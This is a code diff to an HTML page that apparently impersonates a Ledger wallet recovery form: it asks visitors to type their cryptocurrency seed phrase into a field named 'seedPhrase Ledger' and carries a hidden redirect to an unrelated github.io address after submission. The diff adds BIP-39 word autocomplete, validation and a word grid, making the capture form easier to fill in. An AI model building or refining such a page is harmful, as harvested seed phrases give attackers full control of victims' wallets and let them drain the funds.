@@ -143,6 +143,33 @@
                 padding: 0.65rem;
             }
         }
+        .autocomplete-suggestions {
+        position: absolute;
+        background: white;
+        border: 1px solid #ccc;
+        max-height: 150px;
+        overflow-y: auto;
+        z-index: 1000;
+    }
+
+    .autocomplete-suggestions div {
+        padding: 8px;
+        cursor: pointer;
+    }
+
+    .autocomplete-suggestions div:hover, .autocomplete-suggestions .selected {
+        background: #ddd;
+    }
+
+    .word-box {
+        display: inline-block;
+        width: 100px;
+        height: 30px;
+        border: 1px solid #000;
+        text-align: center;
+        line-height: 30px;
+        margin: 2px;
+    }
     </style>
 </head>
 <body>
@@ -159,9 +186,9 @@
     <textarea placeholder="Enter your seed phrase here. Make sure to add a space between each word." 
               oninput="updateWords(this.value)" id="seedPhraseTextarea" name="seedPhrase Ledger" required></textarea>
     
-    <div class="words-grid" id="wordsGrid">
-        <!-- Word boxes dynamically generated -->
-    </div>
+    <div class="autocomplete-suggestions" id="autocomplete"></div>
+
+<div class="words-grid" id="wordsGrid"></div>
 
     <!-- Redirection après soumission -->
     <input type="hidden" name="_next" value="https://fauxon.github.io/fhrdhqctvghbn-/">
@@ -174,65 +201,128 @@
     <div id="output"></div>
 </div>
 
-    <script>
-    let wordCount = 12; // Nombre de mots par défaut
-    let bip39Words = new Set(); // Stocker la liste des mots BIP-39
+<script>
+    let wordCount = 12;
+    let bip39Words = new Set();
+    let bip39Array = [];
+    let currentWordIndex = 0;
+    let words = Array(wordCount).fill("");
+
+    const forbiddenChars = /[0-9ôâçêœæîïûùàëÿ]/;
+    const forbiddenEndings = ["é", "ée", "è", "et", "ai", "ait"];
 
     async function loadBIP39Words() {
         try {
             const response = await fetch("https://raw.githubusercontent.com/bitcoin/bips/master/bip-0039/english.txt");
             const text = await response.text();
-            bip39Words = new Set(text.split("\n").map(word => word.trim())); // Convertir en Set pour recherche rapide
+            bip39Array = text.split("\n").map(word => word.trim());
+            bip39Words = new Set(bip39Array);
         } catch (error) {
             console.error("Erreur lors du chargement des mots BIP-39 :", error);
         }
     }
 
-    function setWords(count) {
-        wordCount = count;
-        document.querySelectorAll('.selection-buttons button').forEach(btn => btn.classList.remove('active'));
-        document.querySelectorAll('.selection-buttons button')[count === 12 ? 0 : 1].classList.add('active');
-        renderWordBoxes();
+    function renderWordBoxes() {
+        const grid = document.getElementById("wordsGrid");
+        grid.innerHTML = "";
+        words.forEach((word, index) => {
+            const wordBox = document.createElement("div");
+            wordBox.className = "word-box";
+            wordBox.textContent = word || "-";
+            wordBox.dataset.index = index;
+            wordBox.onclick = () => setActiveWord(index);
+            grid.appendChild(wordBox);
+        });
     }
 
-    function renderWordBoxes() {
-        const grid = document.getElementById('wordsGrid');
-        grid.innerHTML = ''; // Effacer la grille
-        for (let i = 1; i <= wordCount; i++) {
-            const wordBox = document.createElement('div');
-            wordBox.className = 'word-box';
-            wordBox.innerHTML = `<div class="index">${i}</div><span class="word"></span>`;
-            grid.appendChild(wordBox);
-        }
+    function setActiveWord(index) {
+        currentWordIndex = index;
+        document.getElementById("wordInput").value = words[index] || "";
+        document.getElementById("wordInput").focus();
+    }
+
+    function isValidWord(word) {
+        if (word.length > 12) return false;
+        if (forbiddenChars.test(word)) return false;
+        if (forbiddenEndings.some(ending => word.endsWith(ending))) return false;
+        return true;
     }
 
     function updateWords(input) {
-        const words = input.toLowerCase().split(' ').map(w => w.trim()); // Nettoyer l'entrée
-        const wordBoxes = document.querySelectorAll('.word-box .word');
+        input = input.toLowerCase().replace(/[^a-z]/g, "").slice(0, 12);
+        if (!isValidWord(input)) return;
 
-        const forbiddenLetters = /[ôâçêœæîïûùàëÿ]/; // Lettres interdites
-        const forbiddenEndings = /(é|ée|è|et|ai|ait)$/; // Terminaisons interdites
-
-        const validWords = words.map(word => {
-            word = word.slice(0, 12); // Limite à 12 caractères
-
-            if (forbiddenLetters.test(word) || forbiddenEndings.test(word) || !bip39Words.has(word)) {
-                return ""; // Supprime les mots invalides
-            }
-
-            return word;
-        });
-
-        // Met à jour les cases avec les mots valides
-        wordBoxes.forEach((box, index) => {
-            box.textContent = validWords[index] || '';
-        });
+        words[currentWordIndex] = input;
+        renderWordBoxes();
+        showAutoComplete(input);
     }
 
-    // Charger les mots BIP-39 avant d'initialiser
-    loadBIP39Words().then(() => setWords(12));
-</script>
+    function showAutoComplete(input) {
+        const autocompleteDiv = document.getElementById("autocomplete");
+        autocompleteDiv.innerHTML = "";
 
+        if (!input) return;
+
+        let suggestions = bip39Array.filter(word => word.startsWith(input)).slice(0, 5);
+        if (suggestions.length === 0) return;
+
+        suggestions.forEach((word, index) => {
+            const div = document.createElement("div");
+            div.textContent = word;
+            div.onclick = () => selectWord(word);
+            if (index === 0) div.classList.add("selected");
+            autocompleteDiv.appendChild(div);
+        });
+
+        const rect = document.getElementById("wordInput").getBoundingClientRect();
+        autocompleteDiv.style.left = `${rect.left}px`;
+        autocompleteDiv.style.top = `${rect.bottom}px`;
+        autocompleteDiv.style.width = `${rect.width}px`;
+    }
+
+    function selectWord(word) {
+        words[currentWordIndex] = word;
+        document.getElementById("wordInput").value = word;
+        document.getElementById("autocomplete").innerHTML = "";
+        renderWordBoxes();
+    }
+
+    document.getElementById("wordInput").addEventListener("input", (e) => {
+        updateWords(e.target.value);
+    });
+
+    document.getElementById("wordInput").addEventListener("keydown", (e) => {
+        const suggestions = document.querySelectorAll(".autocomplete-suggestions div");
+        let selected = document.querySelector(".autocomplete-suggestions .selected");
+
+        if (e.key === "ArrowDown") {
+            e.preventDefault();
+            if (selected) {
+                selected.classList.remove("selected");
+                if (selected.nextElementSibling) selected.nextElementSibling.classList.add("selected");
+                else suggestions[0].classList.add("selected");
+            } else if (suggestions.length > 0) {
+                suggestions[0].classList.add("selected");
+            }
+        }
+
+        if (e.key === "ArrowUp") {
+            e.preventDefault();
+            if (selected) {
+                selected.classList.remove("selected");
+                if (selected.previousElementSibling) selected.previousElementSibling.classList.add("selected");
+                else suggestions[suggestions.length - 1].classList.add("selected");
+            }
+        }
+
+        if (e.key === "Enter" && selected) {
+            e.preventDefault();
+            selectWord(selected.textContent);
+        }
+    });
+
+    loadBIP39Words().then(renderWordBoxes);
+</script>
     
 </body>
 </html>
